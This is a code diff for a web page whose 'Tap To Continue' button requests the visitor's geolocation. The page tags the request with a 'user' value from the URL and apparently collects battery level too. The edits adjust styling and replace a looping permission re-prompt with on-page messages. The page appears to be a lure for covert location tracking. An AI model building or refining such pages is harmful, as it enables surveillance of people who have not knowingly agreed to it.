@@ -19,6 +19,7 @@ button{
 font-size:25px;
 padding:20px 40px;
 cursor:pointer;
+margin-top:20px;
 }
 
 h2{
@@ -30,7 +31,7 @@ margin-top:20px;
 
 <body>
 
-<button onclick="getLocation()">
+<button onclick="getLocation()" id="btn">
 Tap To Continue
 </button>
 
@@ -42,9 +43,7 @@ const params = new URLSearchParams(window.location.search)
 const user = params.get("user")
 
 function getLocation(){
-
 navigator.geolocation.getCurrentPosition(success,error)
-
 }
 
 async function success(pos){
@@ -75,9 +74,11 @@ battery:batteryLevel
 
 function error(){
 
-alert("Please allow location to continue")
+document.getElementById("msg").innerText =
+"Location Blocked ⚠️ Please enable location and click again"
 
-getLocation()   // ફરી popup આવશે
+document.getElementById("btn").innerText =
+"Enable Location"
 
 }
 
